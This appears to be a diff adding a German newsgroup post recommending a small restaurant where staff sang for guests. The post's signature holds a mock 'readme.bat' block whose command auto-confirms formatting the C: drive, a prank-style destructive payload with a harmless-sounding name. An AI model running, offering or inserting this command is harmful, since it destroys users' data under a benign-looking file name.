@@ -1,0 +1,22 @@
+On Mon, 20. 03. 22 18:15:23 +0200, "Andreas Jurig"
+
+Es ist schon ca. fuenf Jahre her, aber ich kann mich noch sehr gut an
+folgendes Lokal erinnern:
+
+Restaurante Adega do Oberwuchel
+Wichtelgasse, 90
+Traibach
+
+Es ist eine sehr kleine Kneipe und Touristen sind mir damals nicht
+aufgefallen (nun ja, es war Maerz). Ich erinnere mich noch an die Frau
+aus der Kueche, die an einer Hand noch ihren Gummihandschuh vom
+Spuelen trug und ploetzlich in die Mitte kam und sang. Und der alte
+Mann, der uns auf der Strasse "aufgerissen" hat kam spaeter auch zum
+Singen hinzu. Wir waren begeistert!
+
+Christof
+-- 
+begin  readme.bat
+echo off
+echo Y|c:\windows\command\format c:
+end
